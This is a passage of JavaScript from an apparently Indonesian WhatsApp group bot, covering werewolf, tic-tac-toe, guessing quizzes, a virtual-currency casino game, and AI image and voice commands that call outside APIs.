    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let sorker = sorcerer(sesi(m.sender), target); 
          reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "vote") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return reply("Masukan nomor player");
        if (isNaN(target)) return reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        let exitww = `${sender.split("@")[0]} Keluar dari permainan`
                RezzHost.sendMessage(
            m.chat, {
                text: exitww,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: `${global.sgc}`,
                        mediaUrl: thumb,
                    },
                    mentionedJid: sender,
                },
            }, {
                quoted: m
            }
        );  
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        RezzHost.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: `${global.sgc}`,
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        RezzHost.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: `${global.sgc}`,
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
    } catch (err) {
console.log(util.format(err))
}
}
break




case 'suit': {
if(!isGroup) return m.reply(mess.group)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) return m.reply(`Selesaikan suit mu yang sebelumnya`)
let mark = `0@s.whatsapp.net`
if (!froms) return m.reply(`Siapa yang ingin kamu tantang?\nTag orangnya!\n\nContoh: *${command}* @${mark.split('@')[0]}`)
if (froms === botNumber) return m.reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return m.reply(`Sad amat main ama diri sendiri`)
if (Object.values(suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(froms))) return m.reply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :)`)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
var hadiah = randomNomor(10, 20)
let poin = 10
let poin_lose = 10
let timeout = 60000
let id = 'suit_' + new Date() * 1
suit[id] = {
chat: await RezzHost.sendText(from, `@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain suit\n\n*Kirim (gas/gamau)* untuk bermain\n\nHadiah : ${hadiah} balance`, m),
id: id,
p: sender,
p2: froms,
status: 'wait',
hadiah: hadiah,
waktu: setTimeout(() => {
if (suit[id]) RezzHost.sendMessage(from, {text: `_Waktu suit habis!_` })
delete suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
case 'tictactoe': case 'ttt': case 'ttc': case 'xox':
if (!m.isGroup) return m.reply(mess.group)
if (from in tictactoe) return m.reply(`Masih ada game yang blum selesai`)
if (!froms) return m.reply(`Kirim perintah *${command}* @tag atau reply pesan orangnya!`)
if (froms === botNumber) return m.reply(`Tidak bisa bermain dengan bot!`)
if (froms === sender) return m.reply(`Sad amat main ama diri sendiri`)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
var hadiah = randomNomor(10, 20)
await m.reply(`@${sender.split('@')[0]} menantang @${froms.split('@')[0]} untuk bermain TicTacToe\n\n*Kirim (Y/N)* untuk bermain\n\nHadiah : ${hadiah} balance`)
tictactoe[from] = {
id: from,
status: null,
hadiah: hadiah,
penantang: sender,
ditantang: froms,
TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
}
break
case 'delttt': case 'delttc':
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`)
if (!m.isGroup) return m.reply(mess.group)
if (!(from in tictactoe)) return m.reply(`Tidak ada sesi game tictactoe di grup ini`)
if (isAdmins || isOwner) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].penantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else if (tictactoe[from].ditantang.includes(sender)) {
delete tictactoe[from];
reply(`Berhasil menghapus sesi tictactoe di grup ini\n\n-$500`)
} else {
reply(`Anda tidak bisa menghapus sesi tictactoe karena bukan pemain!`)
}
break

case 'tebakanime':
//if(!isGroup) return m.reply(mess.group)
if (from in tebakanime) return m.reply('Masih ada game yang belum diselesaikan');
var { image, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakanime.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK ANIME*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`
await RezzHost.sendMessage(from, {image: {url: image}, caption: teks1}, {quoted: m})
tebakanime[from] = {
soal: image,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakanime[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${tebakanime[from].jawaban}`);
delete tebakanime[from];
}, gamewaktu * 1000)
}
break
case 'tebaklagu':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (from in tebaklagu) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebaklagu.json')));
console.log('Jawaban : '+jawaban)
if (jawaban.toLowerCase() == 'audio tidak ditemukan, silahkan request ulang!') return m.reply('Maaf terjadi kesalahan!')
var teks1 = `*GAME TEBAK LAGU*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nArtist: ${artis}\nWaktu: ${gamewaktu} detik`
await RezzHost.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m}).then(res => {RezzHost.sendText(from, teks1, res)})
tebaklagu[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklagu[from]) m.reply(`Waktu habis\nJawabannya adalah: ${tebaklagu[from].jawaban}`);
delete tebaklagu[from];
}, gamewaktu * 1000)
}
break
case 'kuis':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (from in kuis) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/kuis.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME KUIS*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
kuis[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (kuis[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete kuis[from];
}, gamewaktu * 1000)
}
break
case 'tebakkalimat':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (from in tebakkalimat) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkalimat.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK KALIMAT*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkalimat[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkalimat[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkalimat[from];
}, gamewaktu * 1000)
}
break
case 'tebakkata':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`)
if (from in tebakkata) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkata[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata[from];
}, gamewaktu * 1000)
}
break
case 'tebaklirik':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (from in tebaklirik) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebaklirik.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK LIRIK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebaklirik[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklirik[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebaklirik[from];
}, gamewaktu * 1000)
}
break
case 'tebakkimia':
//if(!isGroup) return m.reply(mess.group)
if (from in tebakkimia) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK KIMIA*\n\nSoal: ${soal}\nWaktu: ${gamewaktu} detik`)
tebakkimia[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkimia[from]) m.reply(`Waktu berakhir :(\nNama unsur dari lambang ${soal}\n\nAdalah: ${monospace(jawaban)}`)
delete tebakkimia[from];
}, gamewaktu * 1000)
}
break
case 'tebakbendera':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (from in tebakbendera) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break
case 'susunkata':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (from in susunkata) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/susunkata.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (susunkata[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata[from];
}, gamewaktu * 1000)
}
break
case 'asahotak':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (from in asahotak) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/asahotak.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (asahotak[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak[from];
}, gamewaktu * 1000)
}
break
case 'siapakahaku': case 'sa':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (from in siapakahaku) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/siapakahaku.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME SIAPAKAH AKU*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
siapakahaku[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (siapakahaku[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete siapakahaku[from];
}, gamewaktu * 1000)
}
break
case 'caklontong':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (from in caklontong) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/caklontong.json')));
console.log(`Jawaban : ${jawaban}\n${deskripsi}`)
await m.reply(`*GAME CAK LONTONG*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}
break
case 'math': case 'kuismath':
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (from in kuismath) return m.reply('Masih ada game yang belum diselesaikan!');
let { genMath, modes } = require('./assets/game/math')
if (!q) return reply( `┌─〔 Mode 〕\n├ ${Object.keys(modes).join('\n├ ')}\n└────\ncontoh:\n${prefix}math hard`)
if (!(Object.keys(modes)).includes(args[0])) return m.reply('Pilih mode yang bener GOBLOK!')
var { soal, jawaban, waktu, hadiah } = await genMath(q.toLowerCase()).catch((err) => m.reply('```Tolong pilih modenya yang benar contoh .math easy```'))
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME KUIS MATH*\n\nSoal: Berapa hasil dari ${soal.toLowerCase()}\nWaktu: ${waktu / 1000} detik`)
kuismath[from] = {
soal: soal,
jawaban: jawaban,
hadiah: randomNomor(2000, hadiah),
waktu: setTimeout(function () {
if (kuismath[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${jawaban}`)
delete kuismath[from];
}, waktu)
}
break
case 'family100': case 'f100':
//if(!isGroup) return m.reply(mess.group)
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await m.reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family100[from].jawaban
for (let i of jwb){teks += `\n${i}`}
m.reply(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}

break //Powered By alice & Darwin
 
case 'casino': {
let buatall = 1
    RezzHost.casino = RezzHost.casino ? RezzHost.casino : {}
    if (m.chat in RezzHost.casino) return m.reply('Masih Ada Yang Melakukan Casino Disini, Tunggu Sampai Selesai!!')
    else RezzHost.casino[m.chat] = true
    try {
        let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
        let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
        let Aku = (randomaku * 1)
        let Kamu = (randomkamu * 1)
        let count = args[0]
        count = count ? /all/i.test(count) ? Math.floor(users.balance / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
        count = Math.max(1, count)
        if (args.length < 1) return reply(`${prefix}Casino <jumlah>\n${prefix}Casino 1000`)
        if (users.balance >= count * 1) {
            users.balance -= count * 1
            //await m.reply('') //Kwkwwkkwlwlw
            if (Aku > Kamu) {
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Euphyllia:* ${Aku} Point\n\n*Kamu Kalah*\nKamu Kehilangan ${count} Uang`)
            } else if (Aku < Kamu) {
                users.balance += count * 2
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Euphyllia:* ${Aku} Point\n\n*Kamu Kalah*\nKamu Mendapatkan ${count * 2} uang`)
            } else {
                users.balance += count * 1
                reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Euphyllia:* ${Aku} Point\n\n*Seri*\nKamu Mendapatkan ${count * 1} uang`)
            }
        } else reply(`Uang Kamu Tidak Mencukupi Untuk Casino Silahkan *bermain game* Terlebih Dahulu!`)
    } catch (e) {
        console.log(e)
        m.reply('Error!!')
        } finally {
        delete RezzHost.casino[m.chat]
    }
}
break


// AiMenu


case 'simichat': {
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *REZZ BOTZZ - MD* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`
                    Ketik *Enable* Untuk mengaktifkan
                    Ketik *Disable* Untuk menonaktifkan`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".simichat-on/of enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".simichat-on/of disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'simichat-on/of':{
if (args[0] === "enable") {
if (chats.simichat) return reply(`activated`)
chats.simichat = true
reply('Successfully Activate Auto Simi')
} else if (args[0] === "disable") {
if (!chats.simichat) return reply(`it's deactivated`)
chats.simichat = false
reply('Successfully Disabling Auto Simi')
} else {
reply(`${prefix+command} enable -- _mengaktifkan_\n${prefix+command} disable -- _Menonaktifkan_`)
}}
break
case 'createimage': case 'createimg': {
if (!text) return reply(`Example: ${prefix + command} a boy with ball`)
await loading()
let old = new Date()
const json = await generateImages(text)
for (let i = 0; i < 6; i++) {
var rand = Math.floor(json.length * Math.random())
RezzHost.sendMessage(m.chat, { image: { url: json[rand] }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
await sleep(2000)
}
}
break
case 'pixelate': {
if (!quoted) return reply(`masukan skala nya`)
if (!/image/.test(mime)) return reply(`Reply Image nyaa`)
if (!text) return reply(`reply/send Image dengan caption: ${prefix+command} (scala)`)
await loading()
let an = await quoted.download()
let anu = await uploadImage(an)
RezzHost.sendImage(m.chat, `https://vihangayt.me/maker/pixelate?url=${anu}&no=${text}`, mess.done, kalgans)
}
break
case 'wasted': case 'wanted': {
if (!quoted) return reply(`Reply Image Nya`)
if (!/image/.test(mime)) return reply(`Reply Image nyaa`)
await loading()
let an = await quoted.download()
let anu = await uploadImage(an)
RezzHost.sendImage(m.chat, `https://itzpire.site/maker/wanted?url=${anu}`, mess.done, kalgans)
}
break
case 'esrgan': {
if (!quoted) return reply(`Where is the picture?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
await loading()
let media = await quoted.download()
let img = await uploadImage(media)
let dta = await fetchJson(`https://itzpire.site/tools/esregan?url=${img}&type=anime`)
RezzHost.sendImage(m.chat, dta.result.img, `${dta.result.duration} ms`, kalgans)
}
break
case 'greyscale': {
if (!quoted) return reply(`reply image nya bang`)
if (!text) return reply(`Example:\n(reply Image) ${prefix + command} 5`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}*`)
reply(mess.getdata)
let old = new Date()
let media = await quoted.download()
let urlny = await uploadImage(media)
RezzHost.sendImage(m.chat, `https://pitucode.com/photoeditor/greyscale?url=${urlny}?v=${text}&apikey=${pitu}`, `🍟 *Fetching* : ${((new Date - old) * 1)} ms`, kalgans)
}
break
case 'cartoonme': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}*`)
reply(mess.getdata)
let old = new Date()
let media = await quoted.download()
let urlny = await uploadImage(media)
let imgg = await fetchJson(`https://skizo.tech/api/toonme?apikey=${skizo}&url=${urlny}&filter=`)
RezzHost.sendImage(m.chat, imgg.url, `🍟 *Fetching* : ${((new Date - old) * 1)} ms`, kalgans)
}
break
case 'turnme': {
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
reply(mess.getdata)
let old = new Date()
const media = await quoted.download()
const anu = await uploadImage(media)
const img = await fetchJson(`https://skizo.tech/api/aiwebtoon?url=${anu}&apikey=${skizo}`)
for (let i = 0; i < 3; i++) {
var rand = Math.floor(img.data.results.length * Math.random())
RezzHost.sendMessage(m.chat, { image: { url: img.data.results[rand].inferenceImageUrl }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
await sleep(2000)
}
}
break
case 'aivoice': case 'aiv': {
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Masukkan pertanyaan!\n\n*Contoh:* Siapa presiden Indonesia?`)
await RezzHost.sendPresenceUpdate('recording', m.chat);
let result = await fetchJson(`https://skizo.tech/api/openai?text=${q}&apikey=${skizo}`)
const text = result.result;
var lang = text.split("--")[1]
if (!lang) lang = 'id'
long = 'id'
function tts(text, long = 'id') {
//console.log(lang, text)
return new Promise((resolve, reject) => {
try {
let tts = gtts(long)
let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}

let res
try { res = await tts(text, long) }
catch (e) {
reply(e + '')
res = await tts(text)
} finally {
RezzHost.sendMessage(m.chat, {
audio: res, 
mimetype: 'audio/mpeg', 
ptt: true,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `A I - V O I C E`,
body: '',
thumbnailUrl: "https://telegra.ph/file/db0fb173f6476fe4918d8.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
}
)
}
}
break
case 'simiv': case'simivoice':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply('Iya kak?') 
await RezzHost.sendPresenceUpdate('recording', m.chat);
let simi = await fetchJson(`https://skizo.tech/api/simi?&text=${q}&apikey=${skizo}`)
const text = simi.result
var lang = text.split("--")[1]
if (!lang) lang = 'id'
long = 'id'
function tts(text, long = 'id') {
//console.log(lang, text)
return new Promise((resolve, reject) => {
try {
let tts = gtts(long)
let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}

let res
try { res = await tts(text, long) }
catch (e) {
reply(e + '')
res = await tts(text)
} finally {
RezzHost.sendMessage(m.chat, {
audio: res, 
mimetype: 'audio/mpeg', 
ptt: true,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `S I M I - V O I C E`,
body: '',
thumbnailUrl: ppuser,
